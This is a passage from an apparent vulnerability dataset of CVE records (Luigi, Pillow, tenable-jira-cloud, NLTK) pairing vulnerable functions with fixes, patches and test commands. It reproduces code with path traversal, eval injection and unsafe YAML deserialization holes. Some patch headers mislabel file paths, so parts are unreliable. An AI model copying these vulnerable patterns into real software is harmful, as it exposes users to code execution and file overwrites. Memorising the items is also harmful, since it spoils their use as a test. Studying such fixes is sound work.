        "start_line": 47,
        "end_line": 60,
        "snippet": "def extract_packages_archive(work_dir):\n    package_file = os.path.join(work_dir, \"packages.tar\")\n    if not os.path.exists(package_file):\n        return\n\n    curdir = os.path.abspath(os.curdir)\n\n    os.chdir(work_dir)\n    extractor = SafeExtractor(work_dir)\n    extractor.safe_extract(package_file)\n    if '' not in sys.path:\n        sys.path.insert(0, '')\n\n    os.chdir(curdir)"
      },
      {
        "id": "fix_py_36_3",
        "commit": "b5d1b96",
        "file_path": "luigi/contrib/sge_runner.py",
        "start_line": 39,
        "end_line": 39,
        "snippet": "from luigi.safe_extractor import SafeExtractor"
      },
      {
        "id": "fix_py_36_4",
        "commit": "b5d1b96",
        "file_path": "luigi/contrib/sge_runner.py",
        "start_line": 59,
        "end_line": 72,
        "snippet": "def _extract_packages_archive(work_dir):\n    package_file = os.path.join(work_dir, \"packages.tar\")\n    if not os.path.exists(package_file):\n        return\n\n    curdir = os.path.abspath(os.curdir)\n\n    os.chdir(work_dir)\n    extractor = SafeExtractor(work_dir)\n    extractor.safe_extract(package_file)\n    if '' not in sys.path:\n        sys.path.insert(0, '')\n\n    os.chdir(curdir)"
      },
      {
        "id": "fix_py_36_5",
        "commit": "b5d1b96",
        "file_path": "luigi/safe_extractor.py",
        "start_line": 1,
        "end_line": 97,
        "snippet": "# -*- coding: utf-8 -*-\n#\n# Copyright 2012-2015 Spotify AB\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n# http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\n\n\"\"\"\nThis module provides a class `SafeExtractor` that offers a secure way to extract tar files while\nmitigating path traversal vulnerabilities, which can occur when files inside the archive are\ncrafted to escape the intended extraction directory.\n\nThe `SafeExtractor` ensures that the extracted file paths are validated before extraction to\nprevent malicious archives from extracting files outside the intended directory.\n\nClasses:\n    SafeExtractor: A class to securely extract tar files with protection against path traversal attacks.\n\nUsage Example:\n    extractor = SafeExtractor(\"/desired/directory\")\n    extractor.safe_extract(\"archive.tar\")\n\"\"\"\n\nimport os\nimport tarfile\n\n\nclass SafeExtractor:\n    \"\"\"\n    A class to safely extract tar files, ensuring that no path traversal\n    vulnerabilities are exploited.\n\n    Attributes:\n        path (str): The directory to extract files into.\n\n    Methods:\n        _is_within_directory(directory, target):\n            Checks if a target path is within a given directory.\n\n        safe_extract(tar_path, members=None, \\\\*, numeric_owner=False):\n            Safely extracts the contents of a tar file to the specified directory.\n    \"\"\"\n\n    def __init__(self, path=\".\"):\n        \"\"\"\n        Initializes the SafeExtractor with the specified directory path.\n\n        Args:\n            path (str): The directory to extract files into. Defaults to the current directory.\n        \"\"\"\n        self.path = path\n\n    @staticmethod\n    def _is_within_directory(directory, target):\n        \"\"\"\n        Checks if a target path is within a given directory.\n\n        Args:\n            directory (str): The directory to check against.\n            target (str): The target path to check.\n\n        Returns:\n            bool: True if the target path is within the directory, False otherwise.\n        \"\"\"\n        abs_directory = os.path.abspath(directory)\n        abs_target = os.path.abspath(target)\n        prefix = os.path.commonprefix([abs_directory, abs_target])\n        return prefix == abs_directory\n\n    def safe_extract(self, tar_path, members=None, *, numeric_owner=False):\n        \"\"\"\n        Safely extracts the contents of a tar file to the specified directory.\n\n        Args:\n            tar_path (str): The path to the tar file to extract.\n            members (list, optional): A list of members to extract. Defaults to None.\n            numeric_owner (bool, optional): If True, only the numeric owner will be used. Defaults to False.\n\n        Raises:\n            RuntimeError: If a path traversal attempt is detected.\n        \"\"\"\n        with tarfile.open(tar_path, 'r') as tar:\n            for member in tar.getmembers():\n                member_path = os.path.join(self.path, member.name)\n                if not self._is_within_directory(self.path, member_path):\n                    raise RuntimeError(\"Attempted Path Traversal in Tar File\")\n            tar.extractall(self.path, members, numeric_owner=numeric_owner)"
      }
    ],
    "vul_patch": "--- a/luigi/contrib/lsf_runner.py\n+++ b/luigi/contrib/lsf_runner.py\n@@ -1,16 +1 @@\n-def extract_packages_archive(work_dir):\n-    package_file = os.path.join(work_dir, \"packages.tar\")\n-    if not os.path.exists(package_file):\n-        return\n-\n-    curdir = os.path.abspath(os.curdir)\n-\n-    os.chdir(work_dir)\n-    tar = tarfile.open(package_file)\n-    for tarinfo in tar:\n-        tar.extract(tarinfo)\n-    tar.close()\n-    if '' not in sys.path:\n-        sys.path.insert(0, '')\n-\n-    os.chdir(curdir)\n+from luigi.safe_extractor import SafeExtractor\n\n--- a/luigi/contrib/sge_runner.py\n+++ b/luigi/contrib/lsf_runner.py\n@@ -1,4 +1,4 @@\n-def _extract_packages_archive(work_dir):\n+def extract_packages_archive(work_dir):\n     package_file = os.path.join(work_dir, \"packages.tar\")\n     if not os.path.exists(package_file):\n         return\n@@ -6,10 +6,8 @@\n     curdir = os.path.abspath(os.curdir)\n \n     os.chdir(work_dir)\n-    tar = tarfile.open(package_file)\n-    for tarinfo in tar:\n-        tar.extract(tarinfo)\n-    tar.close()\n+    extractor = SafeExtractor(work_dir)\n+    extractor.safe_extract(package_file)\n     if '' not in sys.path:\n         sys.path.insert(0, '')\n \n\n--- /dev/null\n+++ b/luigi/contrib/lsf_runner.py\n@@ -0,0 +1 @@\n+from luigi.safe_extractor import SafeExtractor\n\n--- /dev/null\n+++ b/luigi/contrib/lsf_runner.py\n@@ -0,0 +1,14 @@\n+def _extract_packages_archive(work_dir):\n+    package_file = os.path.join(work_dir, \"packages.tar\")\n+    if not os.path.exists(package_file):\n+        return\n+\n+    curdir = os.path.abspath(os.curdir)\n+\n+    os.chdir(work_dir)\n+    extractor = SafeExtractor(work_dir)\n+    extractor.safe_extract(package_file)\n+    if '' not in sys.path:\n+        sys.path.insert(0, '')\n+\n+    os.chdir(curdir)\n\n--- /dev/null\n+++ b/luigi/contrib/lsf_runner.py\n@@ -0,0 +1,97 @@\n+# -*- coding: utf-8 -*-\n+#\n+# Copyright 2012-2015 Spotify AB\n+#\n+# Licensed under the Apache License, Version 2.0 (the \"License\");\n+# you may not use this file except in compliance with the License.\n+# You may obtain a copy of the License at\n+#\n+# http://www.apache.org/licenses/LICENSE-2.0\n+#\n+# Unless required by applicable law or agreed to in writing, software\n+# distributed under the License is distributed on an \"AS IS\" BASIS,\n+# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+# See the License for the specific language governing permissions and\n+# limitations under the License.\n+#\n+\n+\"\"\"\n+This module provides a class `SafeExtractor` that offers a secure way to extract tar files while\n+mitigating path traversal vulnerabilities, which can occur when files inside the archive are\n+crafted to escape the intended extraction directory.\n+\n+The `SafeExtractor` ensures that the extracted file paths are validated before extraction to\n+prevent malicious archives from extracting files outside the intended directory.\n+\n+Classes:\n+    SafeExtractor: A class to securely extract tar files with protection against path traversal attacks.\n+\n+Usage Example:\n+    extractor = SafeExtractor(\"/desired/directory\")\n+    extractor.safe_extract(\"archive.tar\")\n+\"\"\"\n+\n+import os\n+import tarfile\n+\n+\n+class SafeExtractor:\n+    \"\"\"\n+    A class to safely extract tar files, ensuring that no path traversal\n+    vulnerabilities are exploited.\n+\n+    Attributes:\n+        path (str): The directory to extract files into.\n+\n+    Methods:\n+        _is_within_directory(directory, target):\n+            Checks if a target path is within a given directory.\n+\n+        safe_extract(tar_path, members=None, \\\\*, numeric_owner=False):\n+            Safely extracts the contents of a tar file to the specified directory.\n+    \"\"\"\n+\n+    def __init__(self, path=\".\"):\n+        \"\"\"\n+        Initializes the SafeExtractor with the specified directory path.\n+\n+        Args:\n+            path (str): The directory to extract files into. Defaults to the current directory.\n+        \"\"\"\n+        self.path = path\n+\n+    @staticmethod\n+    def _is_within_directory(directory, target):\n+        \"\"\"\n+        Checks if a target path is within a given directory.\n+\n+        Args:\n+            directory (str): The directory to check against.\n+            target (str): The target path to check.\n+\n+        Returns:\n+            bool: True if the target path is within the directory, False otherwise.\n+        \"\"\"\n+        abs_directory = os.path.abspath(directory)\n+        abs_target = os.path.abspath(target)\n+        prefix = os.path.commonprefix([abs_directory, abs_target])\n+        return prefix == abs_directory\n+\n+    def safe_extract(self, tar_path, members=None, *, numeric_owner=False):\n+        \"\"\"\n+        Safely extracts the contents of a tar file to the specified directory.\n+\n+        Args:\n+            tar_path (str): The path to the tar file to extract.\n+            members (list, optional): A list of members to extract. Defaults to None.\n+            numeric_owner (bool, optional): If True, only the numeric owner will be used. Defaults to False.\n+\n+        Raises:\n+            RuntimeError: If a path traversal attempt is detected.\n+        \"\"\"\n+        with tarfile.open(tar_path, 'r') as tar:\n+            for member in tar.getmembers():\n+                member_path = os.path.join(self.path, member.name)\n+                if not self._is_within_directory(self.path, member_path):\n+                    raise RuntimeError(\"Attempted Path Traversal in Tar File\")\n+            tar.extractall(self.path, members, numeric_owner=numeric_owner)\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2024-21542:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/luigi\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2024-21542/bin/python -m pytest hand_test.py test/safe_extractor_test.py -xvs\n",
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-50447",
    "cve_description": "Pillow through 10.1.0 allows PIL.ImageMath.eval Arbitrary Code Execution via the environment parameter, a different vulnerability than CVE-2022-22817 (which was about the expression parameter).",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/python-pillow/Pillow",
    "patch_url": [
      "https://github.com/python-pillow/Pillow/commit/45c726fd4daa63236a8f3653530f297dc87b160a"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_347_1",
        "commit": "c3af2643ddddfc80a509a1060db253e7930c2adc",
        "file_path": "src/PIL/ImageMath.py",
        "start_line": 222,
        "end_line": 260,
        "snippet": "def eval(expression, _dict={}, **kw):\n    \"\"\"\n    Evaluates an image expression.\n\n    :param expression: A string containing a Python-style expression.\n    :param options: Values to add to the evaluation context.  You\n                    can either use a dictionary, or one or more keyword\n                    arguments.\n    :return: The evaluated expression. This is usually an image object, but can\n             also be an integer, a floating point value, or a pixel tuple,\n             depending on the expression.\n    \"\"\"\n\n    # build execution namespace\n    args = ops.copy()\n    args.update(_dict)\n    args.update(kw)\n    for k, v in args.items():\n        if hasattr(v, \"im\"):\n            args[k] = _Operand(v)\n\n    compiled_code = compile(expression, \"<string>\", \"eval\")\n\n    def scan(code):\n        for const in code.co_consts:\n            if type(const) is type(compiled_code):\n                scan(const)\n\n        for name in code.co_names:\n            if name not in args and name != \"abs\":\n                msg = f\"'{name}' not allowed\"\n                raise ValueError(msg)\n\n    scan(compiled_code)\n    out = builtins.eval(expression, {\"__builtins\": {\"abs\": abs}}, args)\n    try:\n        return out.im\n    except AttributeError:\n        return out"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_347_1",
        "commit": "45c726fd4daa63236a8f3653530f297dc87b160a",
        "file_path": "src/PIL/ImageMath.py",
        "start_line": 222,
        "end_line": 264,
        "snippet": "def eval(expression, _dict={}, **kw):\n    \"\"\"\n    Evaluates an image expression.\n\n    :param expression: A string containing a Python-style expression.\n    :param options: Values to add to the evaluation context.  You\n                    can either use a dictionary, or one or more keyword\n                    arguments.\n    :return: The evaluated expression. This is usually an image object, but can\n             also be an integer, a floating point value, or a pixel tuple,\n             depending on the expression.\n    \"\"\"\n\n    # build execution namespace\n    args = ops.copy()\n    args.update(_dict)\n    args.update(kw)\n    for k, v in args.items():\n        if '__' in k or hasattr(__builtins__, k):\n            msg = f\"'{k}' not allowed\"\n            raise ValueError(msg)\n\n        if hasattr(v, \"im\"):\n            args[k] = _Operand(v)\n\n    compiled_code = compile(expression, \"<string>\", \"eval\")\n\n    def scan(code):\n        for const in code.co_consts:\n            if type(const) is type(compiled_code):\n                scan(const)\n\n        for name in code.co_names:\n            if name not in args and name != \"abs\":\n                msg = f\"'{name}' not allowed\"\n                raise ValueError(msg)\n\n    scan(compiled_code)\n    out = builtins.eval(expression, {\"__builtins\": {\"abs\": abs}}, args)\n    try:\n        return out.im\n    except AttributeError:\n        return out"
      }
    ],
    "vul_patch": "--- a/src/PIL/ImageMath.py\n+++ b/src/PIL/ImageMath.py\n@@ -16,6 +16,10 @@\n     args.update(_dict)\n     args.update(kw)\n     for k, v in args.items():\n+        if '__' in k or hasattr(__builtins__, k):\n+            msg = f\"'{k}' not allowed\"\n+            raise ValueError(msg)\n+\n         if hasattr(v, \"im\"):\n             args[k] = _Operand(v)\n \n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-21371",
    "cve_description": "Tenable for Jira Cloud is an open source project designed to pull Tenable.io vulnerability data, then generate Jira Tasks and sub-tasks based on the vulnerabilities' current state. It published in pypi as \"tenable-jira-cloud\". In tenable-jira-cloud before version 1.1.21, it is possible to run arbitrary commands through the yaml.load() method. This could allow an attacker with local access to the host to run arbitrary code by running the application with a specially crafted YAML configuration file. This is fixed in version 1.1.21 by using yaml.safe_load() instead of yaml.load().",
    "cwe_info": {
      "CWE-502": {
        "name": "Deserialization of Untrusted Data",
        "description": "The product deserializes untrusted data without sufficiently ensuring that the resulting data will be valid."
      }
    },
    "repo": "https://github.com/tenable/integration-jira-cloud",
    "patch_url": [
      "https://github.com/tenable/integration-jira-cloud/commit/f8c2095fd529e664e7fa25403a0a4a85bb3907d0"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_77_1",
        "commit": "fa838db",
        "file_path": "tenable_jira/cli.py",
        "start_line": "59",
        "end_line": "231",
        "snippet": "def cli(configfile, observed_since, setup_only=False, troubleshoot=False):\n    '''\n    Tenable.io -> Jira Cloud Transformer & Ingester\n    '''\n    # Load the config, but ensure that any additional fields are additive to the\n    # basic field set.\n    config_from_file = yaml.load(configfile, Loader=yaml.Loader)\n    fields = config_from_file.pop('custom_fields', list())\n    config = dict_merge(base_config(), config_from_file)\n    config['fields'] = config['fields'] + fields\n\n    if config['tenable'].get('tio_transform_tags'):\n        attr_cache = config['tenable'].get('tio_asset_attr_cache', list())\n        tag_attrs = config['tenable'].get('tio_transform_tags', list())\n        config['tenable']['tio_asset_attr_cache'] = attr_cache + tag_attrs\n\n\n    # Get the logging definition and define any defaults as need be.\n    log = config.get('log', {})\n    log_lvls = {'debug': 10, 'info': 20, 'warn': 30, 'error': 40}\n    log['level'] = log_lvls[log.get('level', 'warn')]\n    log['format'] = log.get('format',\n        '%(asctime)-15s %(name)s %(levelname)s %(message)s')\n\n    # Configure the root logging facility\n    if troubleshoot:\n        logging.basicConfig(\n            level=logging.DEBUG,\n            format=log['format'],\n            filename='tenable_debug.log'\n        )\n    else:\n        logging.basicConfig(**log)\n\n    # Output some basic information detailing the config file used and the\n    # python version & system arch.\n    logging.info('Tenable2JiraCloud Version {}'.format(__version__))\n    logging.info('Using configuration file {}'.format(configfile.name))\n    uname = platform.uname()\n    logging.info('Running on Python {} {}/{}'.format(\n        '.'.join([str(i) for i in sys.version_info][0:3]),\n        uname[0], uname[-2]))\n\n    # instantiate the Jira object\n    jira = Jira(\n        'https://{}/rest/api/3'.format(config['jira']['address']),\n        config['jira']['api_username'],\n        config['jira']['api_token']\n    )\n\n    # Initiate the Tenable.io API model, the Ingester model, and start the\n    # ingestion and data transformation.\n    if config['tenable'].get('platform') == 'tenable.io':\n        if not observed_since:\n            # if no since field is supplied, then look in the config file to see\n            # if an age was applied, if not, then use the default of 30 days.\n            observed_since = arrow.now()\\\n                .shift(days=-config['tenable'].get('tio_age', 30))\\\n                .floor('day').timestamp()\n\n        source = TenableIO(\n            access_key=config['tenable'].get('access_key'),\n            secret_key=config['tenable'].get('secret_key'),\n            vendor='Tenable',\n            product='JiraCloud',\n            build=__version__\n        )\n        if int(source.session.details().get('permissions')) < 64:\n            logging.error('API Keys tie to non-admin user.')\n    elif config['tenable'].get('platform') == 'tenable.sc':\n        source = TenableSC(\n            config['tenable'].get('address'),\n            port=int(config['tenable'].get('port', 443)),\n            username=config['tenable'].get('username'),\n            password=config['tenable'].get('password'),\n            access_key=config['tenable'].get('access_key'),\n            secret_key=config['tenable'].get('secret_key'),\n            vendor='Tenable',\n            product='JiraCloud',\n            build=__version__\n        )\n    else:\n        logging.error('No valid Tenable platform configuration defined.')\n        exit(1)\n    ingest = Tio2Jira(source, jira, config)\n\n    if troubleshoot:\n        # if the troubleshooting flag is set, then we will be collecting some\n        # basic information and outputting it to the screen in a format that\n        # Github issues would expect to format it all pretty.  This should help\n        # reduce the amount of time that is spent with back-and-forth debugging.\n        try:\n            ingest.ingest(int(observed_since))\n        except:\n            logging.exception('Caught the following Exception')\n\n        # Some basic redaction of sensitive data, such as API Keys, Usernames,\n        # Passwords, and hostnames.\n        addr = config_from_file['jira']['address']\n        sc_addr = 'NOTHING_TO_SEE_HERE_AT_ALL'\n        config_from_file['jira']['address'] = '<REDACTED>'\n        config_from_file['jira']['api_token'] = '<REDACTED>'\n        config_from_file['jira']['api_username'] = '<REDACTED>'\n        config_from_file['project']['leadAccountId'] = '<REDACTED>'\n        if config_from_file['tenable'].get('address'):\n            sc_addr = config_from_file['tenable']['address']\n            config_from_file['tenable']['address'] = '<REDACTED>'\n        if config_from_file['tenable'].get('access_key'):\n            config_from_file['tenable']['access_key'] = '<REDACTED>'\n        if config_from_file['tenable'].get('secret_key'):\n            config_from_file['tenable']['secret_key'] = '<REDACTED>'\n        if config_from_file['tenable'].get('username'):\n            config_from_file['tenable']['username'] = '<REDACTED>'\n        if config_from_file['tenable'].get('password'):\n            config_from_file['tenable']['password'] = '<REDACTED>'\n\n        output = troubleshooting.format(\n            configfile=yaml.dump(config_from_file, default_flow_style=False),\n            logging=open('tenable_debug.log').read() \\\n                .replace(addr, '<JIRA_CLOUD_HOST>') \\\n                .replace(sc_addr, '<TENABLE_SC_HOST>'),\n            issuetypes='\\n'.join(\n                [\n                    '{id}: {name}'.format(**a)\n                    for a in jira.issue_types.list()\n                    if a.get('name').lower() in ['task', 'subtask', 'sub-task']\n                ]\n            )\n        )\n        print(output)\n        print('\\n'.join([\n            '/-------------------------------NOTICE-----------------------------------\\\\',\n            '| The output above is helpful for us to troubleshoot exactly what is     |',\n            '| happening within the code and offer a diagnosis for how to correct.    |',\n            '| Please note that while some basic redaction has already been performed |',\n            '| that we ask you to review the information you\\'re about to send and     |',\n            '| ensure that nothing deemed sensitive is transmitted.                   |',\n            '| ---------------------------------------------------------------------- |',\n            '| -- Copy of output saved to \"issue_debug.md\"                            |',\n            '\\\\------------------------------------------------------------------------/'\n        ]))\n        with open('issue_debug.md', 'w') as reportfile:\n            print(output, file=reportfile)\n        os.remove('tenable_debug.log')\n    elif not setup_only:\n        ingest.ingest(observed_since)\n\n        # If we are expected to continually re-run the transformer, then we will\n        # need to track the passage of time and run every X hours, where X is\n        # defined by the user in the configuration.\n        if config.get('service', {}).get('interval', 0) > 0:\n            sleeper = int(config['service']['interval']) * 3600\n            while True:\n                last_run = int(time.time())\n                logging.info(\n                    'Sleeping for {}h'.format(sleeper/3600))\n                time.sleep(sleeper)\n                logging.info(\n                    'Initiating ingest with observed_since={}'.format(last_run))\n                ingest.ingest(last_run)\n    elif setup_only:\n        # In setup-only mode, the ingest will not run, and instead a config file\n        # will be generated that will have all of the JIRA identifiers baked in\n        # and will also inform the integration to ignore the screen builder.\n        # When using this config, if there are any changes to the code, then\n        # this config will need to be re-generated.\n        config['screen']['no_create'] = True\n        logging.info('Set to setup-only.  Will not run ingest.')\n        logging.info('The following is the updated config file from the setup.')\n        with open('generated_config.yaml', 'w') as outfile:\n            outfile.write(yaml.dump(config, Dumper=yaml.Dumper))\n        logging.info('Generated \"generated_config.yaml\" config file.')\n        logging.info('This config file should be updated for every new version of this integration.')"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_77_1",
        "commit": "f8c2095",
        "file_path": "tenable_jira/cli.py",
        "start_line": "59",
        "end_line": "231",
        "snippet": "def cli(configfile, observed_since, setup_only=False, troubleshoot=False):\n    '''\n    Tenable.io -> Jira Cloud Transformer & Ingester\n    '''\n    # Load the config, but ensure that any additional fields are additive to the\n    # basic field set.\n    config_from_file = yaml.safe_load(configfile)\n    fields = config_from_file.pop('custom_fields', list())\n    config = dict_merge(base_config(), config_from_file)\n    config['fields'] = config['fields'] + fields\n\n    if config['tenable'].get('tio_transform_tags'):\n        attr_cache = config['tenable'].get('tio_asset_attr_cache', list())\n        tag_attrs = config['tenable'].get('tio_transform_tags', list())\n        config['tenable']['tio_asset_attr_cache'] = attr_cache + tag_attrs\n\n\n    # Get the logging definition and define any defaults as need be.\n    log = config.get('log', {})\n    log_lvls = {'debug': 10, 'info': 20, 'warn': 30, 'error': 40}\n    log['level'] = log_lvls[log.get('level', 'warn')]\n    log['format'] = log.get('format',\n        '%(asctime)-15s %(name)s %(levelname)s %(message)s')\n\n    # Configure the root logging facility\n    if troubleshoot:\n        logging.basicConfig(\n            level=logging.DEBUG,\n            format=log['format'],\n            filename='tenable_debug.log'\n        )\n    else:\n        logging.basicConfig(**log)\n\n    # Output some basic information detailing the config file used and the\n    # python version & system arch.\n    logging.info('Tenable2JiraCloud Version {}'.format(__version__))\n    logging.info('Using configuration file {}'.format(configfile.name))\n    uname = platform.uname()\n    logging.info('Running on Python {} {}/{}'.format(\n        '.'.join([str(i) for i in sys.version_info][0:3]),\n        uname[0], uname[-2]))\n\n    # instantiate the Jira object\n    jira = Jira(\n        'https://{}/rest/api/3'.format(config['jira']['address']),\n        config['jira']['api_username'],\n        config['jira']['api_token']\n    )\n\n    # Initiate the Tenable.io API model, the Ingester model, and start the\n    # ingestion and data transformation.\n    if config['tenable'].get('platform') == 'tenable.io':\n        if not observed_since:\n            # if no since field is supplied, then look in the config file to see\n            # if an age was applied, if not, then use the default of 30 days.\n            observed_since = arrow.now()\\\n                .shift(days=-config['tenable'].get('tio_age', 30))\\\n                .floor('day').timestamp()\n\n        source = TenableIO(\n            access_key=config['tenable'].get('access_key'),\n            secret_key=config['tenable'].get('secret_key'),\n            vendor='Tenable',\n            product='JiraCloud',\n            build=__version__\n        )\n        if int(source.session.details().get('permissions')) < 64:\n            logging.error('API Keys tie to non-admin user.')\n    elif config['tenable'].get('platform') == 'tenable.sc':\n        source = TenableSC(\n            config['tenable'].get('address'),\n            port=int(config['tenable'].get('port', 443)),\n            username=config['tenable'].get('username'),\n            password=config['tenable'].get('password'),\n            access_key=config['tenable'].get('access_key'),\n            secret_key=config['tenable'].get('secret_key'),\n            vendor='Tenable',\n            product='JiraCloud',\n            build=__version__\n        )\n    else:\n        logging.error('No valid Tenable platform configuration defined.')\n        exit(1)\n    ingest = Tio2Jira(source, jira, config)\n\n    if troubleshoot:\n        # if the troubleshooting flag is set, then we will be collecting some\n        # basic information and outputting it to the screen in a format that\n        # Github issues would expect to format it all pretty.  This should help\n        # reduce the amount of time that is spent with back-and-forth debugging.\n        try:\n            ingest.ingest(int(observed_since))\n        except:\n            logging.exception('Caught the following Exception')\n\n        # Some basic redaction of sensitive data, such as API Keys, Usernames,\n        # Passwords, and hostnames.\n        addr = config_from_file['jira']['address']\n        sc_addr = 'NOTHING_TO_SEE_HERE_AT_ALL'\n        config_from_file['jira']['address'] = '<REDACTED>'\n        config_from_file['jira']['api_token'] = '<REDACTED>'\n        config_from_file['jira']['api_username'] = '<REDACTED>'\n        config_from_file['project']['leadAccountId'] = '<REDACTED>'\n        if config_from_file['tenable'].get('address'):\n            sc_addr = config_from_file['tenable']['address']\n            config_from_file['tenable']['address'] = '<REDACTED>'\n        if config_from_file['tenable'].get('access_key'):\n            config_from_file['tenable']['access_key'] = '<REDACTED>'\n        if config_from_file['tenable'].get('secret_key'):\n            config_from_file['tenable']['secret_key'] = '<REDACTED>'\n        if config_from_file['tenable'].get('username'):\n            config_from_file['tenable']['username'] = '<REDACTED>'\n        if config_from_file['tenable'].get('password'):\n            config_from_file['tenable']['password'] = '<REDACTED>'\n\n        output = troubleshooting.format(\n            configfile=yaml.dump(config_from_file, default_flow_style=False),\n            logging=open('tenable_debug.log').read() \\\n                .replace(addr, '<JIRA_CLOUD_HOST>') \\\n                .replace(sc_addr, '<TENABLE_SC_HOST>'),\n            issuetypes='\\n'.join(\n                [\n                    '{id}: {name}'.format(**a)\n                    for a in jira.issue_types.list()\n                    if a.get('name').lower() in ['task', 'subtask', 'sub-task']\n                ]\n            )\n        )\n        print(output)\n        print('\\n'.join([\n            '/-------------------------------NOTICE-----------------------------------\\\\',\n            '| The output above is helpful for us to troubleshoot exactly what is     |',\n            '| happening within the code and offer a diagnosis for how to correct.    |',\n            '| Please note that while some basic redaction has already been performed |',\n            '| that we ask you to review the information you\\'re about to send and     |',\n            '| ensure that nothing deemed sensitive is transmitted.                   |',\n            '| ---------------------------------------------------------------------- |',\n            '| -- Copy of output saved to \"issue_debug.md\"                            |',\n            '\\\\------------------------------------------------------------------------/'\n        ]))\n        with open('issue_debug.md', 'w') as reportfile:\n            print(output, file=reportfile)\n        os.remove('tenable_debug.log')\n    elif not setup_only:\n        ingest.ingest(observed_since)\n\n        # If we are expected to continually re-run the transformer, then we will\n        # need to track the passage of time and run every X hours, where X is\n        # defined by the user in the configuration.\n        if config.get('service', {}).get('interval', 0) > 0:\n            sleeper = int(config['service']['interval']) * 3600\n            while True:\n                last_run = int(time.time())\n                logging.info(\n                    'Sleeping for {}h'.format(sleeper/3600))\n                time.sleep(sleeper)\n                logging.info(\n                    'Initiating ingest with observed_since={}'.format(last_run))\n                ingest.ingest(last_run)\n    elif setup_only:\n        # In setup-only mode, the ingest will not run, and instead a config file\n        # will be generated that will have all of the JIRA identifiers baked in\n        # and will also inform the integration to ignore the screen builder.\n        # When using this config, if there are any changes to the code, then\n        # this config will need to be re-generated.\n        config['screen']['no_create'] = True\n        logging.info('Set to setup-only.  Will not run ingest.')\n        logging.info('The following is the updated config file from the setup.')\n        with open('generated_config.yaml', 'w') as outfile:\n            outfile.write(yaml.dump(config, Dumper=yaml.Dumper))\n        logging.info('Generated \"generated_config.yaml\" config file.')\n        logging.info('This config file should be updated for every new version of this integration.')"
      }
    ],
    "vul_patch": "--- a/tenable_jira/cli.py\n+++ b/tenable_jira/cli.py\n@@ -4,7 +4,7 @@\n     '''\n     # Load the config, but ensure that any additional fields are additive to the\n     # basic field set.\n-    config_from_file = yaml.load(configfile, Loader=yaml.Loader)\n+    config_from_file = yaml.safe_load(configfile)\n     fields = config_from_file.pop('custom_fields', list())\n     config = dict_merge(base_config(), config_from_file)\n     config['fields'] = config['fields'] + fields\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2019-14751",
    "cve_description": "NLTK Downloader before 3.4.5 is vulnerable to a directory traversal, allowing attackers to write arbitrary files via a ../ (dot dot slash) in an NLTK package (ZIP archive) that is mishandled during extraction.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/nltk/nltk",
    "patch_url": [
      "https://github.com/nltk/nltk/commit/f59d7ed8df2e0e957f7f247fe218032abdbe9a10"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_98_1",
        "commit": "2554ff4",
        "file_path": "nltk/downloader.py",
        "start_line": "2249",
        "end_line": "2300",
        "snippet": "def _unzip_iter(filename, root, verbose=True):\n    if verbose:\n        sys.stdout.write('Unzipping %s' % os.path.split(filename)[1])\n        sys.stdout.flush()\n\n    try:\n        zf = zipfile.ZipFile(filename)\n    except zipfile.error as e:\n        yield ErrorMessage(filename, 'Error with downloaded zip file')\n        return\n    except Exception as e:\n        yield ErrorMessage(filename, e)\n        return\n\n    # Get lists of directories & files\n    namelist = zf.namelist()\n    dirlist = set()\n    for x in namelist:\n        if x.endswith('/'):\n            dirlist.add(x)\n        else:\n            dirlist.add(x.rsplit('/', 1)[0] + '/')\n    filelist = [x for x in namelist if not x.endswith('/')]\n\n    # Create the target directory if it doesn't exist\n    if not os.path.exists(root):\n        os.mkdir(root)\n\n    # Create the directory structure\n    for dirname in sorted(dirlist):\n        pieces = dirname[:-1].split('/')\n        for i in range(len(pieces)):\n            dirpath = os.path.join(root, *pieces[: i + 1])\n            if not os.path.exists(dirpath):\n                os.mkdir(dirpath)\n\n    # Extract files.\n    for i, filename in enumerate(filelist):\n        filepath = os.path.join(root, *filename.split('/'))\n\n        try:\n            with open(filepath, 'wb') as dstfile, zf.open(filename) as srcfile:\n                shutil.copyfileobj(srcfile, dstfile)\n        except 